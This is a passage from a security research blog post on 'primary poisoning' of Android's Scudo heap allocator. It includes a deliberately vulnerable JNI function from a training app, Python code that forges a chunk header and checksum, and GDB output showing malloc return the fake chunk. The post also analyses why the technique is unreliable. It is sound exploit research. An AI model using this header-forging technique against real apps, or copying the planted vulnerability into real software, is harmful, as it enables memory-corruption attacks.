&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">uint8_t&lt;/span> called &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buffer &lt;span style="color:#f92672">=&lt;/span> NULL;
JNIEXPORT jbyteArray JNICALL &lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_PoCPrimaryPoisoning_free&lt;/span>(
JNIEnv &lt;span style="color:#f92672">*&lt;/span>env,
jobject class,
jbyteArray chunk) {
&lt;span style="color:#75715e">// Leaks the pointer of a global buffer on first call.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>called) {
called&lt;span style="color:#f92672">++&lt;/span>;
buffer &lt;span style="color:#f92672">=&lt;/span> malloc(BUFFER_SIZE); &lt;span style="color:#75715e">// enough memory to store full classid 1 chunk
&lt;/span>&lt;span style="color:#75715e">&lt;/span> jbyteArray ar &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray(env, &lt;span style="color:#ae81ff">8&lt;/span>);
jbyte &lt;span style="color:#f92672">*&lt;/span>leak &lt;span style="color:#f92672">=&lt;/span> (jbyte&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer;
(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion(env, ar, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, leak);
&lt;span style="color:#66d9ef">return&lt;/span> ar;
}
&lt;span style="color:#75715e">// Calls free(buffer + 0x10) and tries to avoid heap meta data overflows
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>raw &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements(env, chunk, NULL);
&lt;span style="color:#66d9ef">uint32_t&lt;/span> length &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength(env, chunk);
&lt;span style="color:#66d9ef">if&lt;/span> (raw) {
memcpy(buffer, raw, (length &lt;span style="color:#f92672">&amp;lt;=&lt;/span> BUFFER_SIZE) &lt;span style="color:#f92672">?&lt;/span> length : BUFFER_SIZE);
&lt;span style="color:#75715e">// Brings attacker - controlled chunk into primary
&lt;/span>&lt;span style="color:#75715e">&lt;/span> free(buffer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>); &lt;span style="color:#75715e">// combined header
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>new &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x10&lt;/span>);
jbyteArray output &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray(env, &lt;span style="color:#ae81ff">0x10&lt;/span>);
(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion(env, output, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x10&lt;/span>, new);
&lt;span style="color:#66d9ef">return&lt;/span> output;
}
&lt;span style="color:#66d9ef">return&lt;/span> NULL;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then, an attacker could write the header first, then 8 bytes of padding, followed by e.g. a string &amp;ldquo;Hello World!&amp;rdquo;. Lets see that in action!&lt;/p>
&lt;p>Lets say the first call to this function leaked &lt;code>pointer = 0x7bac7976f730&lt;/code> and say we somehow got &lt;strong>a&lt;/strong> cookie from a previous leak or so, &lt;code>Cookie = 0x2a7e&lt;/code>. Then we could use the following code to craft the fake header:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">combined_header &lt;span style="color:#f92672">=&lt;/span> unpacked_header()
combined_header&lt;span style="color:#f92672">.&lt;/span>ClassId &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e"># Smallest allocation class --&amp;gt; primary, user_data_size=0x10&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>State &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e"># = Allocated --&amp;gt; cannot free a free chunk&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>SizeOrUnusedBytes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># Bypass quarantine (actually irrelevant)&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>OriginOrWasZeroed &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># = allocated via malloc&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>Offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># chunk_start ~= usr_ptr - header_size - offset&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>Checksum &lt;span style="color:#f92672">=&lt;/span> utils&lt;span style="color:#f92672">.&lt;/span>android_crc32(
cookie, &lt;span style="color:#75715e"># 0x2a7e&lt;/span>
pointer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>, &lt;span style="color:#75715e"># buffer = 0x7bac7976f730 =&amp;gt; buffer + 0x10 fake user data&lt;/span>
combined_header&lt;span style="color:#f92672">.&lt;/span>pack() &lt;span style="color:#75715e"># u64 representation of this header, with checksum=0&lt;/span>
)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>With the above, the header looks like &lt;code>0x75a5000000000101&lt;/code> (mind little - endian).&lt;/p>
&lt;p>If we send &lt;code>combined_header.bytes() + p64(0) + b'Hello World!&lt;/code> and set a breakpoint right before the call to &lt;code>free(buffer + 0x10)&lt;/code>, we get:&lt;/p>
&lt;pre tabindex="0">&lt;code>...
gef➤ i r rdi
rdi 0x7bac7976f740 0x7bac7976f740
gef➤ x/4gx $rdi-0x10
0x7bac7976f730: 0x75a5000000000101 0x0000000000000000
0x7bac7976f740: 0x6f57206f6c6c6548 0x0000000021646c72
...
&lt;/code>&lt;/pre>&lt;p>Notice that the leaked pointer is &lt;code>0x7bac7976f730&lt;/code>! So this looks promising! Stepping over &lt;code>free&lt;/code> will either tell us that we messed up by aborting, or will work and thus our fake chunk is in the primary.&lt;/p>
&lt;p>It seems to have worked! The next call is to &lt;code>malloc(0x10)&lt;/code> (see that the actual chunk size will be &lt;code>0x20&lt;/code>, if &lt;code>malloc(0x10)&lt;/code> is called, because &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=337;drc=b45a2ea782074944f79fc388df20b06e01f265f7">header&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=338;drc=b45a2ea782074944f79fc388df20b06e01f265f7">padding&lt;/a> are also stored). As &lt;code>combined_header.ClassId = 1&lt;/code>, the chunk that we freed is part of the chunk array that is used to serve &lt;code>malloc(0x10)&lt;/code> calls! Executing &lt;code>malloc(0x10)&lt;/code> yields:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ i r edi
edi 0x10 0x10
gef➤ ni
...
gef➤ i r rax
rax 0x7bac7976f740 0x7bac7976f740
gef➤ x/s $rax
0x7bac7976f740: &amp;quot;Hello World!&amp;quot;
&lt;/code>&lt;/pre>&lt;p>Remember that we called &lt;code>free(buffer + 0x10) = free(0x7bac7976f730 + 0x10) = free(0x7bac7976f740)&lt;/code>!&lt;/p>
&lt;p>Therefore, not only did we move a chunk of size &lt;code>0x30&lt;/code> (includes header size &lt;code>0x10&lt;/code>; remember that &lt;code>buffer = malloc(BUFFER_SIZE = 0x20)&lt;/code>) to the chunk array that contains chunks of size only &lt;code>0x20&lt;/code>. But we also served a &amp;ldquo;preinitialized&amp;rdquo; chunk. Notice that we basically performed two different things at the same time:&lt;/p>
&lt;ol>
&lt;li>Served an &lt;em>arbitrary&lt;/em> chunk (we will soon see that this cannot be &lt;em>that arbitrary&lt;/em>&amp;hellip;)&lt;/li>
&lt;li>Preinitialized data. This is actually unexpected, but a nice feature :) Basically, this allows us to infer that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=329;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Options.getFillContentsMode() = NoFill&lt;/code>&lt;/a>, which comes from &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=153;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">setting the flags&lt;/a> where &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/flags.inc;l=35;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>zero_contents = false&lt;/code>&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/flags.inc;l=37;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>pattern_fill_contents = false&lt;/code>&lt;/a>! This will result in a check that determines &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=471;drc=b45a2ea782074944f79fc388df20b06e01f265f7">what to do with the contents&lt;/a> to evaluate to &lt;code>false&lt;/code>.&lt;/li>
&lt;/ol>
&lt;h5 id="pitfalls-and-challenges">Pitfalls and Challenges&lt;/h5>
&lt;p>The above primary poisoning seems to work perfectly, but I have not told you what assumptions lie in the dark&amp;hellip;&lt;/p>
&lt;p>Lets try to come up with a list of assumptions and constraints (ignoring the base assumption of availability of sufficient leaks and &amp;ldquo;classical&amp;rdquo; ones like that chunk addresses have to be aligned).&lt;/p>
&lt;h6 id="thievish-threads">Thievish Threads&lt;/h6>
&lt;p>As multiple threads share the same allocator (even the same TSD, which contains a cache that represents the primary), another thread could snack our fake chunk just introduced into the primary. Therefore, &lt;strong>primary poisoning is probabilistic&lt;/strong>!&lt;/p>
&lt;p>Moreover the thread that runs the JNI function could be &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=356;drc=b45a2ea782074944f79fc388df20b06e01f265f7">assigned another TSD&lt;/a>, because the old one is overloaded, i.e. there are lots of threads using the same TSD. Again, we would never see our chunk again.&lt;/p>
&lt;p>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/tsd_shared.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=161">It looks like every thread could be assigned every TSD after &lt;em>sufficient execution time&lt;/em>&lt;/a> (further analysis is needed to fully prove this). This might be beneficial in some cases where we want to attack code that is running in another thread.&lt;/p>
&lt;h6 id="multi---threaded-chunk-liberation">Multi - Threaded Chunk Liberation&lt;/h6>
&lt;p>The chunk array might be &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=91;drc=b45a2ea782074944f79fc388df20b06e01f265f7">drained&lt;/a>, because the amount of free chunks, represented by &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=90;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count&lt;/code>&lt;/a>, exceeds an upper bound. E.g. &lt;code>C-&amp;gt;MaxCount = 13&lt;/code> for class id 1, because we can distinguish the following cases for &lt;code>C-&amp;gt;Count&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=183;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count = C-&amp;gt;MaxCount / 2&lt;/code>&lt;/a>. This stems from the fact that &lt;code>deallocate&lt;/code> can create batches if the corresponding &lt;code>Chunks&lt;/code> array is full. To be precise, this will trigger the execution of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>drain&lt;/code>&lt;/a>, where &lt;code>C-&amp;gt;Count = C-&amp;gt;MaxCount&lt;/code>. Therefore the minimum &lt;code>Count = Min(C-&amp;gt;MaxCount / 2, C-&amp;gt;Count)&lt;/code> in &lt;code>drain&lt;/code> will evaluate to &lt;code>0 &amp;lt; C-&amp;gt;MaxCount / 2 &amp;lt; C-&amp;gt;MaxCount&lt;/code>. Finally, &lt;code>C-&amp;gt;Count -= Count &amp;lt;=&amp;gt; C-&amp;gt;Count = C-&amp;gt;MaxCount - C-&amp;gt;MaxCount / 2 = C-&amp;gt;MaxCount / 2&lt;/code>. Notice that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=133;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>C-&amp;gt;MaxCount = 2 * TransferBatch::getMaxCached(Size)&lt;/code>&lt;/a>. As can be seen in the next step, for &lt;code>malloc(0x10)&lt;/code>, this will result in &lt;code>C-&amp;gt;MaxCount = 2 * 13 = 26 =&amp;gt; C-&amp;gt;Count = 26 / 2 = 13&lt;/code>.&lt;/li>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=396;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count = MaxCount&lt;/code>&lt;/a>, i.e.:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">=&lt;/span> MaxCount
&lt;span style="color:#f92672">=&lt;/span> TransferBatch&lt;span style="color:#f92672">::&lt;/span>getMaxCached(Size)
&lt;span style="color:#f92672">=&lt;/span> Min(MaxNumCached, SizeClassMap&lt;span style="color:#f92672">::&lt;/span>getMaxCachedHint(Size))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(Config&lt;span style="color:#f92672">::&lt;/span>MaxNumCachedHint, N)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, (&lt;span style="color:#ae81ff">1U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> Config&lt;span style="color:#f92672">::&lt;/span>MaxBytesCachedLog) &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>u32&lt;span style="color:#f92672">&amp;gt;&lt;/span>(Size))))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, (&lt;span style="color:#ae81ff">1U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>) &lt;span style="color:#f92672">/&lt;/span> Classes[ClassId &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>])))
&lt;/code>&lt;/pre>&lt;/div>where &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/size_class_map.h;l=269;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Classes&lt;/code>&lt;/a>:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">constexpr&lt;/span> u32 Classes[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;span style="color:#ae81ff">0x00020&lt;/span>, &lt;span style="color:#ae81ff">0x00030&lt;/span>, &lt;span style="color:#ae81ff">0x00040&lt;/span>, &lt;span style="color:#ae81ff">0x00050&lt;/span>, &lt;span style="color:#ae81ff">0x00060&lt;/span>, &lt;span style="color:#ae81ff">0x00070&lt;/span>, &lt;span style="color:#ae81ff">0x00080&lt;/span>, &lt;span style="color:#ae81ff">0x00090&lt;/span>,
&lt;span style="color:#ae81ff">0x000a0&lt;/span>, &lt;span style="color:#ae81ff">0x000b0&lt;/span>, &lt;span style="color:#ae81ff">0x000c0&lt;/span>, &lt;span style="color:#ae81ff">0x000e0&lt;/span>, &lt;span style="color:#ae81ff">0x000f0&lt;/span>, &lt;span style="color:#ae81ff">0x00110&lt;/span>, &lt;span style="color:#ae81ff">0x00120&lt;/span>, &lt;span style="color:#ae81ff">0x00130&lt;/span>,
&lt;span style="color:#ae81ff">0x00150&lt;/span>, &lt;span style="color:#ae81ff">0x00160&lt;/span>, &lt;span style="color:#ae81ff">0x00170&lt;/span>, &lt;span style="color:#ae81ff">0x00190&lt;/span>, &lt;span style="color:#ae81ff">0x001d0&lt;/span>, &lt;span style="color:#ae81ff">0x00210&lt;/span>, &lt;span style="color:#ae81ff">0x00240&lt;/span>, &lt;span style="color:#ae81ff">0x002a0&lt;/span>,
&lt;span style="color:#ae81ff">0x00330&lt;/span>, &lt;span style="color:#ae81ff">0x00370&lt;/span>, &lt;span style="color:#ae81ff">0x003a0&lt;/span>, &lt;span style="color:#ae81ff">0x00400&lt;/span>, &lt;span style="color:#ae81ff">0x00430&lt;/span>, &lt;span style="color:#ae81ff">0x004a0&lt;/span>, &lt;span style="color:#ae81ff">0x00530&lt;/span>, &lt;span style="color:#ae81ff">0x00610&lt;/span>,
&lt;span style="color:#ae81ff">0x00730&lt;/span>, &lt;span style="color:#ae81ff">0x00840&lt;/span>, &lt;span style="color:#ae81ff">0x00910&lt;/span>, &lt;span style="color:#ae81ff">0x009c0&lt;/span>, &lt;span style="color:#ae81ff">0x00a60&lt;/span>, &lt;span style="color:#ae81ff">0x00b10&lt;/span>, &lt;span style="color:#ae81ff">0x00ca0&lt;/span>, &lt;span style="color:#ae81ff">0x00e00&lt;/span>,
&lt;span style="color:#ae81ff">0x00fb0&lt;/span>, &lt;span style="color:#ae81ff">0x01030&lt;/span>, &lt;span style="color:#ae81ff">0x01130&lt;/span>, &lt;span style="color:#ae81ff">0x011f0&lt;/span>, &lt;span style="color:#ae81ff">0x01490&lt;/span>, &lt;span style="color:#ae81ff">0x01650&lt;/span>, &lt;span style="color:#ae81ff">0x01930&lt;/span>, &lt;span style="color:#ae81ff">0x02010&lt;/span>,
&lt;span style="color:#ae81ff">0x02190&lt;/span>, &lt;span style="color:#ae81ff">0x02490&lt;/span>, &lt;span style="color:#ae81ff">0x02850&lt;/span>, &lt;span style="color:#ae81ff">0x02d50&lt;/span>, &lt;span style="color:#ae81ff">0x03010&lt;/span>, &lt;span style="color:#ae81ff">0x03210&lt;/span>, &lt;span style="color:#ae81ff">0x03c90&lt;/span>, &lt;span style="color:#ae81ff">0x04090&lt;/span>,
&lt;span style="color:#ae81ff">0x04510&lt;/span>, &lt;span style="color:#ae81ff">0x04810&lt;/span>, &lt;span style="color:#ae81ff">0x05c10&lt;/span>, &lt;span style="color:#ae81ff">0x06f10&lt;/span>, &lt;span style="color:#ae81ff">0x07310&lt;/span>, &lt;span style="color:#ae81ff">0x08010&lt;/span>, &lt;span style="color:#ae81ff">0x0c010&lt;/span>, &lt;span style="color:#ae81ff">0x10010&lt;/span>,
};
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>So for a small allocation, i.e. for &lt;code>ClassId = 1&lt;/code>, we get:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>MaxCount &lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, &lt;span style="color:#ae81ff">0x2000&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, &lt;span style="color:#ae81ff">256&lt;/span>)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, &lt;span style="color:#ae81ff">13&lt;/span>))
&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets say we have &lt;code>C-&amp;gt;Count = 13&lt;/code> and we introduce our fake chunk. Then, on execution of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=84;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>deallocate&lt;/code>&lt;/a>, we get that &lt;code>C-&amp;gt;Count = C-&amp;gt;MaxCount&lt;/code> and therefore &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>drain&lt;/code>&lt;/a> is called. By itself, this would not be an issue, because &lt;code>drain&lt;/code> will only remove the oldest half of the chunks and move the other chunks to the front of the array. But what happens, if there is another thread that wants to free memory? Assuming that the thread performs &lt;code>C-&amp;gt;MaxCount / 2 + 1&lt;/code> calls to &lt;code>deallocate&lt;/code>, this will trigger &lt;code>drain&lt;/code> again and therefore result in our chunk being &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=192;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">pushed back&lt;/a> onto a free list.&lt;/p>
&lt;h6 id="fake-chunk-mispositioning">Fake Chunk Mispositioning&lt;/h6>
&lt;p>The fake chunk may be &amp;ldquo;at the wrong location&amp;rdquo;. To that end, notice that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=95;drc=b45a2ea782074944f79fc388df20b06e01f265f7">compacting a pointer&lt;/a> is done as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">CompactPtrT &lt;span style="color:#a6e22e">compactPtr&lt;/span>(uptr ClassId, uptr Ptr) {
DCHECK_LE(ClassId, SizeClassMap&lt;span style="color:#f92672">::&lt;/span>LargestClassId);
&lt;span style="color:#66d9ef">return&lt;/span> compactPtrInternal(getCompactPtrBaseByClassId(ClassId), Ptr);
}
...
uptr getCompactPtrBaseByClassId(uptr ClassId) {
&lt;span style="color:#75715e">// If we are not compacting pointers, base everything off of 0.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">sizeof&lt;/span>(CompactPtrT) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>(uptr) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> CompactPtrScale &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">getRegionInfo&lt;/span>(ClassId)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>RegionBeg;
}
...
&lt;span style="color:#66d9ef">static&lt;/span> CompactPtrT compactPtrInternal(uptr Base, uptr Ptr) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>CompactPtrT&lt;span style="color:#f92672">&amp;gt;&lt;/span>((Ptr &lt;span style="color:#f92672">-&lt;/span> Base) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> CompactPtrScale);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Basically, a pointer is compacted by subtracting the base address of the region that belongs to a specific class id (e.g. 1) from that pointer and right - shifting the resulting relative offset by some value (often &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/platform.h;l=61;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">4&lt;/a>, which makes sense in terms of alignment).&lt;/p>
&lt;p>When supplying an address from a different segment to &lt;code>free(addr + 0x10)&lt;/code>, we have to ensure that this address is bigger than the base address of the class the fake chunk &amp;ldquo;belongs&amp;rdquo; to. E.g. if we put a fake chunk on the stack, i.e. at &lt;code>0x7babf2c25890&lt;/code> with a header of &lt;code>0x2542000000000101&lt;/code>, but the &lt;em>base&lt;/em> of the region holding class id 1 chunks is &lt;code>0x7bac69744000&lt;/code>, then:&lt;/p>
&lt;pre tabindex="0">&lt;code>sub 0x7babf2c25890, 0x7bac69744000 = 0xfffffffff894e189 -&amp;gt; underflow
&lt;/code>&lt;/pre>&lt;p>Notice that it is (most likely) an invariant that the &lt;em>base&lt;/em> is always smaller than or equal to the address of the chunk to be freed. Therefore, this could be undefined behaviour! The bits 4 to 35 (inclusive) of &lt;code>0xfffffffff894e189&lt;/code>, i.e. &lt;code>0xff894e18&lt;/code>, will be stored in the &lt;code>Chunks&lt;/code> array via (&lt;code>r15 = ptr to store&lt;/code>):&lt;/p>
&lt;pre tabindex="0">&lt;code>...
0x00007baef7fc106b &amp;lt;+523&amp;gt;: sub r15,QWORD PTR [rdx+rsi*1+0x60] # subtraction from above
0x00007baef7fc1070 &amp;lt;+528&amp;gt;: shr r15,0x4
0x00007baef7fc1074 &amp;lt;+532&amp;gt;: lea edx,[rax+0x1]
0x00007baef7fc1077 &amp;lt;+535&amp;gt;: mov DWORD PTR [r14],edx
0x00007baef7fc107a &amp;lt;+538&amp;gt;: mov eax,eax
0x00007baef7fc107c &amp;lt;+540&amp;gt;: mov DWORD PTR [r14+rax*4+0x10],r15d
...
&lt;/code>&lt;/pre>&lt;p>When &lt;code>malloc&lt;/code> is called, then the following is executed (&lt;code>r14d = compacted pointer&lt;/code>):&lt;/p>
&lt;pre tabindex="0">&lt;code>...
0x00007baef7fbcba5 &amp;lt;+389&amp;gt;: mov r14d,DWORD PTR [rbx+rax*4+0x10] # r14d = compacted pointer
0x00007baef7fbcbaa &amp;lt;+394&amp;gt;: add QWORD PTR [r15+0xf88],rcx # stats
0x00007baef7fbcbb1 &amp;lt;+401&amp;gt;: sub QWORD PTR [r15+0xf90],rcx # stats
0x00007baef7fbcbb8 &amp;lt;+408&amp;gt;: mov rax,QWORD PTR [r15+0xfa0]
0x00007baef7fbcbbf &amp;lt;+415&amp;gt;: lea rcx,[r12+r12*2]
0x00007baef7fbcbc3 &amp;lt;+419&amp;gt;: shl rcx,0x6
0x00007baef7fbcbc7 &amp;lt;+423&amp;gt;: shl r14,0x4
0x00007baef7fbcbcb &amp;lt;+427&amp;gt;: add r14,QWORD PTR [rax+rcx*1+0x60]
...
&lt;/code>&lt;/pre>&lt;p>Essentially, &lt;code>malloc&lt;/code> gets rid of the sign that we would get from &lt;code>free&lt;/code> if it was not for unsigned subtraction, i.e. from subtracting something big from something small. Then this value is interpreted as an unsigned integer and added to the base address of the chunk id. The following calculations might clarify that:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ p/x 0x7bac69744000 + 0xf86d04890 = base address + shifted compacted pointer
$16 = 0x7bbbf0448890 = invalid address (reality)
gef➤ p/x 0x7bac69744000 + (int)0xf86d04890 = signed addition!
$17 = 0x7babf0448890 = wanted address (stack)
&lt;/code>&lt;/pre>&lt;p>&lt;code>malloc&lt;/code> will return the (above malformed) chunk.&lt;/p>
&lt;p>If the &amp;ldquo;malformation&amp;rdquo; is controllable, then this:&lt;/p>
&lt;ol>
